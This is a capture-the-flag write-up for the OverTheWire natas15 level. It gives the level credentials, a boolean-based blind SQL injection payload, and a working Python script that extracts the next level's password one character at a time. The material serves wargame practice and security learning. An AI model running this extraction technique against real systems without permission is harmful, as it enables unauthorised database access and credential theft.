# Username
natas15
# Password
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
# Web vulnerability
Boolean-based blind SQL injection
# Method of solve
Identify that the SQL query will return either True or False, then craft a SQL payload which will return True or False and includes the name of a valid user (natas16).
```
natas16" AND SUBSTRING(password,1,3)='hPk' -- -
```
We can use the following script to brute force the password:
```
import requests
import string

# Target URL and credentials
url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

# Characters to test (all letters and numbers)
charset = string.ascii_letters + string.digits

# Storage for the extracted password
extracted_password = ""

# Session to maintain connection and auth
session = requests.Session()
session.auth = (username, password)

print("[*] Starting password extraction...")

# We know the password is 32 characters from previous levels
for position in range(1, 33):
    for char in charset:
        # Craft the boolean-based injection payload
        payload = {
            'username': f'natas16" AND SUBSTRING(password,{position},1)=\'{char}\' -- -'
        }
        
        # Send the request
        response = session.post(url, data=payload)
        
        # Check if the character is correct (boolean response)
        if "This user exists" in response.text:
            extracted_password += char
            print(f"[+] Found character {position}: {char} â†’ Current: {extracted_password}")
            break
    
    # If we didn't find a character (shouldn't happen for natas)
    if len(extracted_password) < position:
        print(f"[-] Couldn't find character at position {position}")
        break

print(f"[!] Complete password: {extracted_password}")
```
